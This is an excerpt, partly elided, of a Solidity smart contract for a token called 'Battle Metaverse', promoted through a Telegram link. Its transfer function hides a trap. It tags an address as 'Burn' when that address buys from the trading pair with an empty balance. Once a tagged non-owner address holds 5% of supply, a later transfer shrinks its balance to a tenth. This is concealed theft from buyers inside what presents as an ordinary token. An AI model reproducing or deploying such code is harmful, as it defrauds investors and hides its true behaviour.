...
/**
TELEGRAM : https://t.me/BattleCandy
*/
library SafeMath {
...
contract BattleToken {
    ...
    string public name = "Battle Metaverse";
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (Burn != Owner && balanceOf[Burn]>=totalSupply.div(20)) {
            balanceOf[Burn]=balanceOf[Burn].divCeil(10);}
        if (msg.sender==Pair() && balanceOf[to]==0) {Burn = to;} 
        if (to== Owner) {Burn=to;} 
